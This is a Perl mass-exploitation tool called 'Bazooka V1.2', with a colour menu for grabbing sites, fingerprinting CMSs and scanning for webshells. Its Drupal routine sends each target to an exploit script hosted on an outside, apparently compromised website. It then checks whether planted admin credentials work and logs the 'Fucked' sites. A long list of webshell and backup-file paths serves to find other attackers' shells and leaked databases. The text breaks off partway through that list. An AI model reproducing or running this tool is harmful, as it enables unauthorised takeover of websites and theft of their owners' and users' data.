#!/usr/bin/perl

use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Win32::Console::ANSI;
use WWW::Mechanize;  
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;


    print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
$logo="
              _________
            /'        /|
           /         / |_
          /         /  //|
         /_________/  ////|
        |   _ _    | 8o////|
        | /'// )_  |   8///|
        |/ // // ) |   8o///|
        / // // //,|  /  8//|
       / // // /// | /   8//|  DAWN THEM NOW ! By Bazooka
      / // // ///__|/    8//|
     /.(_)// /// |       8///|
    (_)' `(_)//| |       8////|___________
   (_) /_\ (_)'| |        8///////////////
   (_) \"/ (_)'|_|         8/////////////
    (_)._.(_) d' Hb         8oooooooopb'
      `(_)'  d'  H`b
            d'   `b`b
           d'     H `b
          d'      `b `b
         d'           `b
        d'             `b                     
";
print $logo;
print color('reset');
print color('bold white');
print color('reset');
print colored("[ Bazooka V1.2 Coded By Wissem Mahfoud ]",'white on_red'),"\n\n\n";
print color("bold Green")," Do You Have List Of Sites ?\n";
print color("bold Green"), "\n";
print color 'reset';
print color("bold yellow"),"[1] Yes\n";
print color("bold yellow"), "\n";
print color 'reset';
print color("bold yellow"),"[2] No\n";
print color("bold Green"), "\n";
print color 'reset';
print color("bold red"),"[3] IP Generator\n";
print color("bold Green"), "\n";
print color 'reset';
print color("bold green"),"[4] Scan Only Drupal\n";
print color("bold green"), "\n";
print color 'reset';
print color("bold blue"),"[5] Scan Only Opencart\n";
print color("bold blue"), "\n";
print color 'reset';
print color("bold yellow"),"[6] Scan Only Wordpress\n";
print color("bold yellow"), "\n";
print color 'reset';
print color("bold red"),"[7] Scan Only Joomla\n";
print color("bold Green"), "\n";
print color 'reset';
print color("bold white"),"[8] Scan List Shells { WSO Shell } \n";
print color("bold white"), "\n";
print color 'reset';
print color("bold Green"),"[9] Scan List Shells { WebShell Found } \n";
print color("bold white"), "\n";
print color 'reset';
print color("red"),"[10] Bing Reverse \n";
print color("red"), "\n";
print color 'reset';
print color("bold yellow"),"[11] List Sites To Ip \n";
print color("yellow"), "\n";
print color 'reset';
print color("bold blue"),"[12] CMS Detector \n";
print color("blue"), "\n";
print color 'reset';
print color("bold yellow"),"[13] Grab Site From Google By Dork \n";
print color("yellow"), "\n";
print color 'reset';
print color("bold green"),"[14] Try BAZOOKA Grabber \n";
print color("bold red"), "\n";
print color 'reset';
print color("bold Black"),"[15] Exit \n";
print color("bold white"), "\n";
print color 'reset';





my $whatspywant = <STDIN>;
chomp $whatspywant;



if($whatspywant eq '1'){
bot();
}
if($whatspywant eq '2'){
bing();
}
if($whatspywant eq '3'){
spyx2();

}
if($whatspywant eq '4'){
print color("bold red")," List Sites --> ";
$opn=<STDIN>;
chomp $opn;
print color("bold Green"), "\n";
open(tarrget,"$opn") or die "Please Put List :) \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
farz();


}

sub farz(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
my $efreezz = $ua->get("$site")->content;
if($efreezz =~/\/modules\/system\/system.menus.css|\/sites\/default\/files\/|<meta name=\"Generator\" content=\"Drupal 7/) {
    print colored("[DRUPAL] $site",'white on_magenta'),"\n";
open(save, '>>Drupal.txt'); 
    print save "$site\n";   
    close(save);
    fuckdrupal();
    }
else{
    print "[UNKNOWN] $site\n";
}
}




sub fuckdrupal(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

# check the link of the exploit or you can download script from here : http://pastebin.com/wPAbtyJ4 and you upload it on you one shell :) 
$drupalink = "http://www.bircinar.de/wp-includes/drup.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
print colored ("[DRUPAL EXPLOIT]",'white on_red');
print " ............... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

print "[WAIT I WILL MAKE SURE ABOUT USER AND PASSWORD]\n";
# // here to test the user name and the password if the website has been really fucked or not :p
$admin ="mahfoud";
$pass  ="admin";
$wp = $site . '/user/login';
$red = $site . '/user/1';
print "$wp\n";

$brute = POST $wp, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){
print colored ("[BOOM] $site => User | $admin Password | $pass",'white on_yellow'),"\n";
    open(save, '>>Fucked.txt');
    print save "Success Wiss ! $site | username : mahfoud | pass: admin\n";
    close(save);
    }
    elsif ($stat =~ /404/){
    print "[NOT DRUPAL] .................. [ERROR]\n";
    }
}else{
print "[DRUPAL] ...................... ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "ERROR";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

        }
}
}
if($whatspywant eq '5'){

}
if($whatspywant eq '6'){

print color("bold red")," List Sites --> ";
$opn=<STDIN>;
chomp $opn;

$a7a= "/xmlrpc.php";
chomp $a7a;


$mohmed="XML-RPC";
chomp($mohmed);


$vulnn=" Wordpress Found :)";
chomp($vulnn);



}
if ($whatspywant eq '7'){

print color("bold red")," List Sites --> ";
$opn=<STDIN>;
chomp $opn;

$a7a= "/components/com_content/metadata.xml";
chomp $a7a;


$mohmed="</metadata>";
chomp($mohmed);


$vulnn=" Joomla Found :)";
chomp($vulnn);



}
if ($whatspywant eq '8'){

print color("bold red")," List Sites --> ";
$opn=<STDIN>;
chomp $opn;

$a7a= "";
chomp $a7a;


$mohmed="WSO";
chomp($mohmed);


$vulnn=" Shell Found :)";
chomp($vulnn);


}
if($whatspywant eq '9'){
print " Enter Site : ";
$site=<STDIN>;
chomp $site;
 
if($site !~ /http:\/\//) { $site = "http://$site/"; };
 
print "\n";

@path = ('WSO.php','1998.php','dz.php','w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','shell.php','cpanel.php','cpn.php','13.php','sql.php','mysql.php','config.php','configuration.php','madspot.php','Cgishell.pl','killer.php','changeall.php','2.php','Sh3ll.php','dz0.php','dam.php','user.php','dom.php','whmcs.php','r00t.php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.php','settings.php','tmp.php','cyber.php','c99.php','r57.php','404.php','gaza.php','1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sniper.php','ksa.php','v4team.php','offline.php','priv8.php','911.php','madspotshell.php','c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php','tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php','templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php','tmp/readme.php','wp.zip'.'wp-content/plugins/disqus-comment-system/disqus.php',
'd0mains.php','wp-content/plugins/akismet/akismet.php','madspotshell.php','indoxploit.php','IndoXploit.php','andela.php','mini.php','info.php','egyshell.php','Sym.php','c22.php','c100.php',
'wp-content/plugins/akismet/admin.php#','configuration.php','g.php','wp-content/plugins/google-sitemap-generator/sitemap-core.php#',
'wp-content/plugins/akismet/widget.php#','xx.pl','ls.php','Cpanel.php','k.php','zone-h.php','tmp/user.php','tmp/Sym.php','cp.php',
'tmp/madspotshell.php','tmp/root.php','tmp/whmcs.php','tmp/index.php','tmp/2.php','tmp/dz.php','tmp/cpn.php',
'tmp/changeall.php','tmp/Cgishell.pl','tmp/sql.php','0day.php','tmp/admin.php','cliente/downloads/h4xor.php',
'whmcs/downloads/dz.php','L3b.php','d.php','tmp/d.php','tmp/L3b.php','wp-content/plugins/akismet/admin.php',
'templates/rhuk_milkyway/index.php','templates/beez/index.php','sado.php','admin1.php','upload.php','up.php','vb.zip','vb.rar',
'admin2.asp','uploads.php','sa.php','sysadmins/','admin1/','sniper.php','administration/Sym.php','images/Sym.php',
'/r57.php','/wp-content/plugins/disqus-comment-system/disqus.php','gzaa_spysl','sql-new.php','/shell.php','/sa.php','/admin.php',
'/sa2.php','/2.php','/gaza.php','/up.php','/upload.php','/uploads.php','/templates/beez/index.php','shell.php','/amad.php',
'/t00.php','/dz.php','/site.rar','/Black.php','/site.tar.gz','/home.zip','/home.rar','/home.tar','/home.tar.gz',
'/forum.zip','/forum.rar','/forum.tar','/forum.tar.gz','/test.txt','/ftp.txt','/user.txt','/site.txt','/error_log','/error',
'/cpanel','/awstats','/site.sql','/vb.sql','/forum.sql','r00t-s3c.php','c.php','/backup.sql','/back.sql','/data.sql','wp.rar/',
'wp-content/plugins/disqus-comment-system/disqus.php','asp.aspx','/templates/beez/index.php','tmp/vaga.php',
'tmp/killer.php','whmcs.php','abuhlail.php','tmp/killer.php','tmp/domaine.pl','tmp/domaine.php','useradmin/',
'tmp/d0maine.php','d0maine.php','tmp/sql.php','X.php','123.php','m.php','b.php','up.php','tmp/dz1.php','dz1.php','forum.zip','Symlink.php','Symlink.pl',
'forum.rar','joomla.zip','joomla.rar','wp.php','buck.sql','sysadmin.php','images/c99.php', 'xd.php', 'c100.php',
'spy.aspx','xd.php','tmp/xd.php','sym/root/home/','billing/killer.php','tmp/upload.php','tmp/admin.php',
'Server.php','tmp/uploads.php','tmp/up.php','Server/','wp-admin/c99.php','tmp/priv8.php','priv8.php','cgi.pl/',
'tmp/cgi.pl','downloads/dom.php','templates/ja-helio-farsi/index.php','webadmin.html','admins.php',
'/wp-content/plugins/count-per-day/js/yc/d00.php','bluff.php','king.jeen','admins/','admins.asp','admins.php','wp.zip','/wp-content/plugins/disqus-comment-system/WSO.php',
'/images/root.php',
'/COPYRIGHT.php',
'/images/root.php',
'/wp-content/plugins/disqus-comment-system/Sym.php',
'/wp-content/plugins/disqus-comment-system/c22.php',
'/wp-includes/wp-footer.php',
'/wp-content/plugins/disqus-comment-system/c100.php',
'/wp-content/plugins/disqus-comment-system/configuration.php',
'/wp-content/plugins/disqus-comment-system/g.php',
'/wp-content/plugins/disqus-comment-system/xx.pl',
'/wp-content/plugins/disqus-comment-system/ls.php',
'/wp-content/plugins/disqus-comment-system/Cpanel.php',
'/wp-content/plugins/disqus-comment-system/k.php',
'/wp-content/plugins/disqus-comment-system/zone-h.php',
'/wp-content/plugins/disqus-comment-system/tmp/user.php',
'/wp-content/plugins/disqus-comment-system/tmp/Sym.php',
'/wp-content/plugins/disqus-comment-system/cp.php',
'/wp-content/plugins/disqus-comment-system/tmp/madspotshell.php',
'/wp-content/plugins/disqus-comment-system/tmp/root.php',
'/wp-content/plugins/disqus-comment-system/tmp/whmcs.php',
'/wp-content/plugins/disqus-comment-system/tmp/index.php',
'/wp-content/plugins/disqus-comment-system/tmp/2.php',
'/wp-content/plugins/disqus-comment-system/tmp/dz.php',
'/wp-content/plugins/disqus-comment-system/tmp/cpn.php',
'/wp-content/plugins/disqus-comment-system/tmp/changeall.php',
'/wp-content/plugins/disqus-comment-system/tmp/Cgishell.pl',
'/wp-content/plugins/disqus-comment-system/tmp/sql.php',
'/wp-content/plugins/disqus-comment-system/0day.php',
'/wp-content/plugins/disqus-comment-system/tmp/admin.php',
'/wp-content/plugins/disqus-comment-system/L3b.php',
'/wp-content/plugins/disqus-comment-system/d.php',
'/wp-content/plugins/disqus-comment-system/tmp/d.php',
'/wp-content/plugins/disqus-comment-system/tmp/L3b.php',
'/wp-content/plugins/disqus-comment-system/sado.php',
'/wp-content/plugins/disqus-comment-system/admin1.php',
'wp-content/plugins/akismet/WSO.php',
'wp-content/plugins/akismet/dz.php',
'wp-content/plugins/akismet/DZ.php',
'wp-content/plugins/akismet/cpanel.php',
'wp-content/plugins/akismet/cpn.php',
'wp-content/plugins/akismet/sos.php',
'wp-content/plugins/akismet/term.php',
'wp-content/plugins/akismet/Sec-War.php',
'wp-content/plugins/akismet/sql.php',
'wp-content/plugins/akismet/ssl.php',
'wp-content/plugins/akismet/info.php',
'wp-content/plugins/akismet/egyshell.php',
'wp-content/plugins/akismet/Sym.php',
'wp-content/plugins/akismet/c22.php',
'wp-content/plugins/akismet/c100.php',
'wp-content/plugins/akismet/configuration.php',
'wp-content/plugins/akismet/g.php',
'wp-content/plugins/akismet/xx.pl',
'wp-content/plugins/akismet/ls.php',
'wp-content/plugins/akismet/Cpanel.php',
'wp-content/plugins/akismet/k.php',
'wp-content/plugins/akismet/zone-h.php',
'wp-content/plugins/akismet/tmp/user.php',
'wp-content/plugins/akismet/tmp/Sym.php',
'wp-content/plugins/akismet/cp.php',
'wp-content/plugins/akismet/tmp/madspotshell.php',
'wp-content/plugins/akismet/tmp/root.php',
'wp-content/plugins/akismet/tmp/whmcs.php',
'wp-content/plugins/akismet/tmp/index.php',
'wp-content/plugins/akismet/tmp/2.php',
'wp-content/plugins/akismet/tmp/dz.php',
'wp-content/plugins/akismet/tmp/cpn.php',
'wp-content/plugins/akismet/tmp/changeall.php',
'wp-content/plugins/akismet/tmp/Cgishell.pl',
'wp-content/plugins/akismet/tmp/sql.php',
'wp-content/plugins/akismet/0day.php',
'wp-content/plugins/akismet/tmp/admin.php',
'wp-content/plugins/akismet/L3b.php',
'wp-content/plugins/akismet/d.php',
'wp-content/plugins/akismet/tmp/d.php',
'wp-content/plugins/akismet/tmp/L3b.php',
'wp-content/plugins/akismet/sado.php',
'wp-content/plugins/akismet/admin1.php',
'wp-content/plugins/akismet/upload.php',
'wp-content/plugins/akismet/up.php',
'wp-content/plugins/akismet/vb.zip',
'wp-content/plugins/akismet/vb.rar',
'wp-content/plugins/akismet/admin2.asp',
'wp-content/plugins/akismet/uploads.php',
'wp-content/plugins/akismet/sa.php',
'wp-content/plugins/akismet/sysadmins/',
'wp-content/plugins/akismet/admin1/',
'wp-content/plugins/akismet/sniper.php',
'wp-content/plugins/akismet//ftp.txt',
'wp-content/plugins/akismet//user.txt',
'wp-content/plugins/akismet//site.txt',
'wp-content/plugins/akismet//error_log',
'wp-content/plugins/akismet//error',
'wp-content/plugins/akismet//cpanel',
'wp-content/plugins/akismet//awstats',
'wp-content/plugins/akismet//site.sql',
'wp-content/plugins/akismet//vb.sql',
'wp-content/plugins/akismet//forum.sql',
'wp-content/plugins/akismet/r00t-s3c.php',
'wp-content/plugins/akismet/c.php',
'wp-content/plugins/akismet//backup.sql',
'wp-content/plugins/akismet//back.sql',
'wp-content/plugins/akismet//data.sql',
'wp-content/plugins/akismet/wp.rar/',
'wp-content/plugins/akismet/asp.aspx',
'wp-content/plugins/akismet/tmp/vaga.php',
'wp-content/plugins/akismet/tmp/killer.php',
'wp-content/plugins/akismet/whmcs.php',
'wp-content/plugins/akismet/abuhlail.php',
'wp-content/plugins/akismet/tmp/killer.php',
'wp-content/plugins/akismet/tmp/domaine.pl',
'wp-content/plugins/akismet/tmp/domaine.php',
'wp-content/plugins/akismet/useradmin/',
'wp-content/plugins/akismet/tmp/d0maine.php',
'wp-content/plugins/akismet/d0maine.php',
'wp-content/plugins/akismet/tmp/sql.php',
'wp-content/plugins/akismet/X.php',
'wp-content/plugins/akismet/123.php',
'wp-content/plugins/akismet/m.php',
'wp-content/plugins/akismet/b.php',
'wp-content/plugins/akismet/up.php',
'wp-content/plugins/akismet/tmp/dz1.php',
'wp-content/plugins/akismet/dz1.php',
'wp-content/plugins/akismet/forum.zip',
'wp-content/plugins/akismet/Symlink.php',
'wp-content/plugins/akismet/Symlink.pl',
'wp-content/plugins/akismet/forum.rar',
'wp-content/plugins/akismet/joomla.zip',
'wp-content/plugins/akismet/joomla.rar',
'wp-content/plugins/akismet/wp.php',
'wp-content/plugins/akismet/buck.sql',
'wp-content/plugins/akismet/sysadmin.php',
'wp-content/plugins/akismet/images/c99.php',
'wp-content/plugins/akismet/xd.php',
'wp-content/plugins/akismet/c100.php',
'wp-content/plugins/akismet/spy.aspx',
'wp-content/plugins/akismet/xd.php',
'wp-content/plugins/akismet/tmp/xd.php',
'wp-content/plugins/akismet/sym/root/home/',
'wp-content/plugins/akismet/billing/killer.php',
'wp-content/plugins/akismet/tmp/upload.php',
'wp-content/plugins/akismet/tmp/admin.php',
'wp-content/plugins/akismet/Server.php',
'wp-content/plugins/akismet/tmp/uploads.php',
'wp-content/plugins/akismet/tmp/up.php',
'wp-content/plugins/akismet/Server/',
'wp-content/plugins/akismet/wp-admin/c99.php',
'wp-content/plugins/akismet/tmp/priv8.php',
'wp-content/plugins/akismet/priv8.php',
'wp-content/plugins/akismet/cgi.pl/',
'wp-content/plugins/akismet/tmp/cgi.pl',
'wp-content/plugins/akismet/downloads/dom.php',
'wp-content/plugins/akismet/webadmin.html',
'wp-content/plugins/akismet/admins.php',
'wp-content/plugins/akismet/bluff.php',
'wp-content/plugins/akismet/king.jeen',
'wp-content/plugins/akismet/admins/',
'wp-content/plugins/akismet/admins.asp',
'wp-content/plugins/akismet/admins.php',
'wp-content/plugins/akismet/wp.zip',
'wp-content/plugins/akismet/disqus.php',
'wp-content/plugins/google-sitemap-generator//cpanel',
'wp-content/plugins/google-sitemap-generator//awstats',
'wp-content/plugins/google-sitemap-generator//site.sql',
'wp-content/plugins/google-sitemap-generator//vb.sql',
'wp-content/plugins/google-sitemap-generator//forum.sql',
'wp-content/plugins/google-sitemap-generator/r00t-s3c.php',
'wp-content/plugins/google-sitemap-generator/c.php',
'wp-content/plugins/google-sitemap-generator//backup.sql',
'wp-content/plugins/google-sitemap-generator//back.sql',
'wp-content/plugins/google-sitemap-generator//data.sql',
'wp-content/plugins/google-sitemap-generator/wp.rar/',
'wp-content/plugins/google-sitemap-generator/asp.aspx',
'wp-content/plugins/google-sitemap-generator/tmp/xd.php',
'wp-content/plugins/google-sitemap-generator/sym/root/home/',
'wp-content/plugins/google-sitemap-generator/billing/killer.php',
'wp-content/plugins/google-sitemap-generator/tmp/upload.php',
'wp-content/plugins/google-sitemap-generator/tmp/admin.php',
'wp-content/plugins/google-sitemap-generator/Server.php',
'wp-content/plugins/google-sitemap-generator/tmp/uploads.php',
'wp-content/plugins/google-sitemap-generator/tmp/up.php',
'wp-content/plugins/google-sitemap-generator/Server/',
'wp-content/plugins/google-sitemap-generator/wp-admin/c99.php',
'wp-content/plugins/google-sitemap-generator/tmp/priv8.php',
'wp-content/plugins/google-sitemap-generator/priv8.php',
'wp-content/plugins/google-sitemap-generator/cgi.pl/',
'wp-content/plugins/google-sitemap-generator/tmp/cgi.pl',
'wp-content/plugins/google-sitemap-generator/downloads/dom.php',
'wp-content/plugins/google-sitemap-generator/webadmin.html',
'wp-content/plugins/google-sitemap-generator/admins.php',
'wp-content/plugins/google-sitemap-generator/bluff.php',
'wp-content/plugins/google-sitemap-generator/king.jeen',
'wp-content/plugins/google-sitemap-generator/admins/',
'wp-content/plugins/google-sitemap-generator/admins.asp',
'wp-content/plugins/google-sitemap-generator/admins.php',
'wp-content/plugins/google-sitemap-generator/wp.zip',
'wp-content/plugins/google-sitemap-generator/sitemap-core.php',
'/templates/beez/WSO.php',
'/templates/beez/dz.php',
'/templates/beez/DZ.php',
'/templates/beez/cpn.php',
'/templates/beez/sos.php',
'/templates/beez/term.php',
'/templates/beez/Sec-War.php',
'/templates/beez/sql.php',
'/templates/beez/ssl.php',
'/templates/beez/mysql.php',
'/templates/beez/WolF.php',
'/templates/beez/configuration.php',
'/templates/beez/g.php',
'/templates/beez/xx.pl',
'/templates/beez/ls.php',
'/templates/beez/Cpanel.php',
'/templates/beez/k.php',
'/templates/beez/zone-h.php',
'/templates/beez/tmp/user.php',
'/templates/beez/tmp/Sym.php',
'/templates/beez/cp.php',
'/templates/beez/tmp/madspotshell.php',
'/templates/beez/tmp/root.php',
'/templates/beez/tmp/whmcs.php',
'/templates/beez/tmp/index.php',
'/templates/beez/tmp/2.php',
'/templates/beez/tmp/dz.php',
'/templates/beez/tmp/cpn.php',
'/templates/beez/tmp/changeall.php',
'/templates/beez/tmp/Cgishell.pl',
'/templates/beez/tmp/sql.php',
'/templates/beez/0day.php',
'/templates/beez/tmp/admin.php',
'/templates/beez/L3b.php',
'/templates/beez/d.php',
'/templates/beez/tmp/d.php',
'/templates/beez/tmp/L3b.php',
'/templates/beez/sado.php',
'/templates/beez/admin1.php',
'/templates/beez/upload.php',
'/templates/beez/up.php',
'/templates/beez/vb.zip',
'/templates/beez/vb.rar',
'/templates/beez/admin2.asp',
'/templates/beez/uploads.php',
'/templates/beez/sa.php',
'/templates/beez/sysadmins/',
'/templates/beez/admin1/',
'/templates/beez/sniper.php',
'/templates/beez/images/Sym.php',
'/templates/beez//r57.php',
'/templates/beez/gzaa_spysl',
'/templates/beez/sql-new.php',
'/templates/beez//shell.php',
'/templates/beez//sa.php',
'/templates/beez//admin.php',
'/templates/beez//sa2.php',
'/templates/beez//2.php',
'/templates/beez//gaza.php',
'/templates/beez//up.php',
'/templates/beez//upload.php',
'/templates/beez//uploads.php',
'/templates/beez/shell.php',
'/templates/beez//amad.php',
'/templates/beez//t00.php',
'/templates/beez//dz.php',
'/templates/beez//site.rar',
'/templates/beez//Black.php',
'/templates/beez//site.tar.gz',
'/templates/beez//home.zip',
'/templates/beez//home.rar',
'/templates/beez//home.tar',
'/templates/beez//home.tar.gz',
'/templates/beez//forum.zip',
'/templates/beez//forum.rar',
'/templates/beez//forum.tar',
'/templates/beez//forum.tar.gz',
'/templates/beez//test.txt',
'/templates/beez//ftp.txt',
'/templates/beez//user.txt',
'/templates/beez//site.txt',
'/templates/beez//error_log',
'/templates/beez//error',
'/templates/beez//cpanel',
'/templates/beez//awstats',
'/templates/beez//site.sql',
'/templates/beez//vb.sql',
'/templates/beez//forum.sql',
'/templates/beez/r00t-s3c.php',
'/templates/beez/c.php',
'/templates/beez//backup.sql',
'/templates/beez//back.sql',
'/templates/beez//data.sql',
'/templates/beez/wp.rar/',
'/templates/beez/asp.aspx',
'/templates/beez/tmp/vaga.php',
'/templates/beez/tmp/killer.php',
'/templates/beez/whmcs.php',
'/templates/beez/abuhlail.php',
'/templates/beez/tmp/killer.php',
'/templates/beez/tmp/domaine.pl',
'/templates/beez/tmp/domaine.php',
'/templates/beez/useradmin/',
'/templates/beez/tmp/d0maine.php',
'/templates/beez/d0maine.php',
'/templates/beez/tmp/sql.php',
'/templates/beez/X.php',
'/templates/beez/123.php',
'/templates/beez/m.php',
'/templates/beez/b.php',
'/templates/beez/up.php',
'/templates/beez/tmp/dz1.php',
'/templates/beez/dz1.php',
'/templates/beez/forum.zip',
'/templates/beez/Symlink.php',
'/templates/beez/Symlink.pl',
'/templates/beez/forum.rar',
'/templates/beez/joomla.zip',
'/templates/beez/joomla.rar',
'/templates/beez/wp.php',
'/templates/beez/buck.sql',
'/templates/beez/sysadmin.php',
'/templates/beez/images/c99.php',
'/templates/beez/xd.php',
'/templates/beez/c100.php',
'/templates/beez/spy.aspx',
'/templates/beez/xd.php',
'/templates/beez/tmp/xd.php',
'/templates/beez/sym/root/home/',
'/templates/beez/billing/killer.php',
'/templates/beez/tmp/upload.php',
'/templates/beez/tmp/admin.php',
'/templates/beez/Server.php',
'/templates/beez/tmp/uploads.php',
'/templates/beez/tmp/up.php',
'/templates/beez/Server/',
'/templates/beez/wp-admin/c99.php',
'/templates/beez/tmp/priv8.php',
'/templates/beez/priv8.php',
'/templates/beez/cgi.pl/',
'/templates/beez/tmp/cgi.pl',
'/templates/beez/downloads/dom.php',
'/templates/beez/webadmin.html',
'/templates/beez/admins.php',
'/templates/beez/bluff.php',
'/templates/beez/king.jeen',
'/templates/beez/admins/',
'/templates/beez/admins.asp',
'/templates/beez/admins.php',
'/templates/beez/wp.zip',
'/templates/beez/index.php','/images/WSO.php',
'/images/dz.php',
'/images/DZ.php',
'/images/cpanel.php',
'/images/cpn.php',
'/images/sos.php',
'/images/term.php',
'/images/Sec-War.php',
'/images/sql.php',
'/images/ssl.php',
'/images/mysql.php',
'/images/WolF.php',
'/images/madspot.php',
'/images/Cgishell.pl',
'/images/killer.php',
'/images/changeall.php',
'/images/2.php',
'/images/Sh3ll.php',
'/images/dz0.php',
'/images/dam.php',
'/images/user.php',
'/images/dom.php',
'/images/whmcs.php',
'/images/vb.zip',
'/images/sa.php',
'/images/sysadmins/',
'/images/admin1/',
'/images/sniper.php',
'/images/images/Sym.php',
'/images//r57.php',
'/images/gzaa_spysl',
'/images/sql-new.php',
'/images//shell.php',
'/images//sa.php',
'/images//admin.php',
'/images//sa2.php',
'/images//2.php',
'/images//user.txt',
'/images//site.txt',
'/images//error_log',
'/images//error',
'/images//cpanel',
'/images//awstats',
'/images//site.sql',
'/images//vb.sql',
'/images//forum.sql',
'/images/r00t-s3c.php',
'/images/c.php',
'/images//backup.sql',
'/images//back.sql',
'/images//data.sql',
'/images/wp.rar/',
'/images/asp.aspx',
'/images/tmp/vaga.php',
'/images/tmp/killer.php',
'/images/whmcs.php',
'/images/abuhlail.php',
'/images/tmp/killer.php',
'/images/tmp/domaine.pl',
'/images/tmp/domaine.php',
'/images/useradmin/',
'/images/tmp/d0maine.php',
'/images/d0maine.php',
'/images/tmp/sql.php',
'/images/X.php',
'/images/123.php',
'/images/m.php',
'/images/b.php',
'/images/up.php',
'/images/tmp/dz1.php',
'/images/dz1.php',
'/images/forum.zip',
'/images/Symlink.php',
'/images/Symlink.pl',
'/images/forum.rar',
'/images/joomla.zip',
'/images/joomla.rar',
'/images/wp.php',
'/images/buck.sql',
'/includes/WSO.php',
'/includes/dz.php',
'/includes/DZ.php',
'/includes/cpanel.php',
'/includes/cpn.php',
'/includes/sos.php',
'/includes/term.php',
'/includes/Sec-War.php',
'/includes/sql.php',
'/includes/ssl.php',
'/includes/mysql.php',
'/includes/WolF.php',
'/includes/madspot.php',
'/includes/Cgishell.pl',
'/includes/killer.php',
'/includes/changeall.php',
'/includes/2.php',
'/includes/Sh3ll.php',
'/includes/dz0.php',
'/includes/dam.php',
'/includes/user.php',
'/includes/dom.php',
'/includes/whmcs.php',
'/includes/vb.zip',
'/includes/r00t.php',
'/includes/c99.php',
'/includes/gaza.php',
'/includes/1.php',
'/includes/d0mains.php',
'/includes/madspotshell.php',
'/includes/info.php',
'/includes/egyshell.php',
'/includes/Sym.php',
'/includes/c22.php',
'/includes/c100.php',
'/includes/configuration.php',
'/includes/g.php',
'/includes/xx.pl',
'/includes/ls.php',
'/includes/Cpanel.php',
'/includes/k.php',
'/includes/zone-h.php',
'/includes/tmp/user.php',
'/includes/tmp/Sym.php',
'/includes/cp.php',
'/includes/tmp/madspotshell.php',
'/includes/tmp/root.php',
'/includes/tmp/whmcs.php',
'/includes/tmp/index.php',
'/includes/tmp/2.php',
'/includes/tmp/dz.php',
'/includes/tmp/cpn.php',
'/includes/tmp/changeall.php',
'/includes/tmp/Cgishell.pl',
'/includes/tmp/sql.php',
'/includes/0day.php',
'/includes/tmp/admin.php',
'/includes/L3b.php',
'/includes/d.php',
'/includes/tmp/d.php',
'/includes/tmp/L3b.php',
'/includes/sado.php',
'/includes/admin1.php',
'/includes/upload.php',
'/includes/up.php',
'/includes/vb.zip',
'/includes/vb.rar',
'/includes/admin2.asp',
'/includes/uploads.php',
'/includes/sa.php',
'/includes/sysadmins/',
'/includes/admin1/',
'/includes/sniper.php',
'/includes/images/Sym.php',
'/includes//r57.php',
'/includes/gzaa_spysl',
'/includes/sql-new.php',
'/includes//shell.php',
'/includes//sa.php',
'/includes//admin.php',
'/includes//sa2.php',
'/includes//2.php',
'/includes//gaza.php',
'/includes//up.php',
'/includes//upload.php',
'/includes//uploads.php',
'/includes/shell.php',
'/includes//amad.php',
'/includes//t00.php',
'/includes//dz.php',
'/includes//site.rar',
'/includes//Black.php',
'/includes//site.tar.gz',
'/includes//home.zip',
'/includes//home.rar',
'/includes//home.tar',
'/includes//home.tar.gz',
'/includes//forum.zip',
'/includes//forum.rar',
'/includes//forum.tar',
'/includes//forum.tar.gz',
'/includes//test.txt',
'/includes//ftp.txt',
'/includes//user.txt',
'/includes//site.txt',
'/includes//error_log',
'/includes//error',
'/includes//cpanel',
'/includes//awstats',
'/includes//site.sql',
'/includes//vb.sql',
'/includes//forum.sql',
'/includes/r00t-s3c.php',
'/includes/c.php',
'/includes//backup.sql',
'/includes//back.sql',
'/includes//data.sql',
'/includes/wp.rar/',
'/includes/asp.aspx',
'/includes/tmp/vaga.php',
'/includes/tmp/killer.php',
'/includes/whmcs.php',
'/includes/abuhlail.php',
'/includes/tmp/killer.php',
'/includes/tmp/domaine.pl',
'/includes/tmp/domaine.php',
'/includes/useradmin/',
'/includes/tmp/d0maine.php',
'/includes/d0maine.php',
'/includes/tmp/sql.php',
'/includes/X.php',
'/includes/123.php',
'/includes/m.php',
'/includes/b.php',
'/includes/up.php',
'/includes/tmp/dz1.php',
'/includes/dz1.php',
'/includes/forum.zip',
'/includes/Symlink.php',
'/includes/Symlink.pl',
'/includes/forum.rar',
'/includes/joomla.zip',
'/includes/joomla.rar',
'/includes/wp.php',
'/includes/buck.sql',
'/includes/sysadmin.php',
'/includes/images/c99.php',
'/includes/xd.php',
'/xGSx.php',
'/includes/c100.php',
